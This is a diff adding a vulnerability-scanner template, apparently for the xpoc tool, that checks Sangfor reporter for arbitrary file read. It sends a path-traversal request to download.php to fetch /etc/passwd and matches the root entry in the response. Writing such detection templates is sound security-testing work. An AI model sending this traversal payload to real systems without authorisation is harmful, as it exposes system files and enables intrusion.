@@ -1,0 +1,17 @@
+id: sangfor-reporter-anyfileread
+
+info:
+  name: Sangfor reporter 任意文件读取
+  author: xpoc
+  severity: high
+  verified: false
+  tags: sangfor,fileread
+  created: 2023/07/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /report/download.php?pdf=../../../../../etc/passwd
+    expression: response.status == 200 && "(root|toor):[x*]:0:0:".bmatches(response.body)
+expression: r0()
